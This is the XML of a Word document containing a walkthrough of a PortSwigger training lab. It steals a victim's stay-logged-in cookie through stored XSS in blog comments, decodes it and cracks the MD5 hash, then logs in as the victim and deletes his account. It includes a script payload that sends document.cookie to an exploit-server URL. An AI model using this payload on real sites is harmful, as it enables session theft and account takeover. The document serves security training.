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22BD" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
      <w:r>
        <w:t>PortSwigger Lab POC - 11-offline-password-cracking</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DE263CF" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 11 — Offline password cracking</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="011BCA0E" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00460E06"/>
    <w:p w14:paraId="4E9EB3EF" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00460E06"/>
    <w:p w14:paraId="3969B1AA" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>🎯 Objective</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26D1986E" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Steal Carlos's stay-logged-in cookie via XSS, crack the MD5 hash offline, then login and delete his account.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51D18D5A" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00460E06"/>
    <w:p w14:paraId="6F2883EB" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0059C07E" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00460E06"/>
    <w:p w14:paraId="6CD461B8" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00460E06"/>
    <w:p w14:paraId="2AB5AE9C" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 1 — Login as wiener</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16F86FC4" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Credentials: `wiener:peter`</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53E4648E" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00460E06"/>
    <w:p w14:paraId="7BF277D2" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="28FDF355" wp14:editId="316CC272">
            <wp:extent cx="5303520" cy="311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A422" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00460E06"/>
    <w:p w14:paraId="2E04751C" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C0D74F5" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00460E06"/>
    <w:p w14:paraId="2B4CC747" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 2 — Find XSS in blog comments</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B85B467" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Go to any blog post → find the comment section → test for XSS.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1366A372" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00460E06"/>
    <w:p w14:paraId="6398FF97" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="346C5C97" wp14:editId="3C28EA24">
            <wp:extent cx="5303520" cy="311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2004" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00460E06"/>
    <w:p w14:paraId="23E32354" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BCF1A51" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00460E06"/>
    <w:p w14:paraId="3331763C" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 3 — Prepare exploit server URL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B91A95A" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Copy your exploit server URL:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E1A9518" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>```</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CD6AACA" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>https://YOUR-ID.exploit-server.net</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2262BE9B" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>```</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41371521" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00460E06"/>
    <w:p w14:paraId="79325E23" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C526C0A" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00460E06"/>
    <w:p w14:paraId="210770E9" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 4 — Inject cookie-stealing payload</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="358353BE" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>In the blog comment, post:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A30633D" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>```html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D5BCC03" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>&lt;script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45AE796A" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>document.location='https://YOUR-ID.exploit-server.net/?c='+document.cookie</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5174A7C1" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03548590" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>```</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C948EBF" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00460E06"/>
    <w:p w14:paraId="4A352063" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="08AB4664" wp14:editId="2DB81F9B">
            <wp:extent cx="5303520" cy="3115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4F20" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00460E06"/>
    <w:p w14:paraId="6C7084AB" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="339E92AD" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00460E06"/>
    <w:p w14:paraId="656DC8BE" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 5 — Capture victim's cookie</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FBB0F51" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Go to **Exploit Server → Access log**.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06477EA8" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00460E06"/>
    <w:p w14:paraId="7FD2998A" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Find the GET request with the cookie:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D595145" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>```</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="768FB3EE" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>GET /?stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01F6B8EF" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>```</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71216BE2" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00460E06"/>
    <w:p w14:paraId="2A34ACC0" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0BA13668" wp14:editId="42B0F6FE">
            <wp:extent cx="5303520" cy="3115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FEAB" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00460E06"/>
    <w:p w14:paraId="7CDDB372" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="603A07A3" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00460E06"/>
    <w:p w14:paraId="2D43CF5C" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 6 — Decode cookie</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D76B96A" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Base64 decode:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EB3EBCD" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>```</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0769FE94" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>carlos:26323c16d5f4dabff3bb136f2460a943</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="085824D9" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>```</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="388A4B56" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00460E06"/>
    <w:p w14:paraId="2C78E60E" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="351E6953" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00460E06"/>
    <w:p w14:paraId="6ABB5E81" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Step 7 — Crack the MD5 hash</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31257466" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>MD5 hash: `26323c16d5f4dabff3bb136f2460a943`</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04EF385D" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00460E06"/>
    <w:p w14:paraId="6851E9F3" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Use an online MD5 cracker (e.g. crackstation.net).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="298908E3" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00460E06"/>
    <w:p w14:paraId="0926BEBD" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>**Cracked password: `onceuponatime`**</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E701D12" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00460E06"/>
    <w:p w14:paraId="1E180F29" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C0A66A6" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00460E06"/>
    <w:p w14:paraId="56109E1C" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 8 — Login as Carlos</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="568E6DAA" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- **Username:** `carlos`</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3111F644" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- **Password:** `onceuponatime`</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19214A93" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00460E06"/>
    <w:p w14:paraId="2D36A1E6" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1A00457E" wp14:editId="1776B6BC">
            <wp:extent cx="5303520" cy="3115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CCBF" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00460E06"/>
    <w:p w14:paraId="74D48D35" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="193A1195" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00460E06"/>
    <w:p w14:paraId="63C1472F" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Step 9 — Delete Carlos's account</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08D4CFE9" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Go to **My account → Delete account** → Lab solved!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6738DE75" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00460E06"/>
    <w:p w14:paraId="0BBB0CEB" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="404D1A78" wp14:editId="68FD5511">
            <wp:extent cx="5303520" cy="3115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41C1" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00460E06"/>
    <w:p w14:paraId="59464D4C" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="791041AF" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00460E06"/>
    <w:p w14:paraId="7FB4D80C" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Result</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57D13FC4" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- **Carlos password:** `onceuponatime`</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11882257" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00460E06"/>
    <w:p w14:paraId="2E9A18CE" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68B66F53" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00460E06"/>
    <w:p w14:paraId="39D9B0D9" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>💡 Key Takeaway</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F624BAC" w14:textId="77777777" w:rsidR="00460E06" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Storing password hashes in cookies (even MD5) is dangerous — they can be cracked offline. Always use unpredictable, signed tokens.</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00460E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74298">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="13966300">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1645308653">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="382599236">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1798141984">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1021198282">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="2073695512">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="695153371">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="1338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E3"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="00460E06"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00AE1C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2667B"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{0C17528B-168A-46BE-BA3A-BC6918FB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2026-05-24T14:09:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>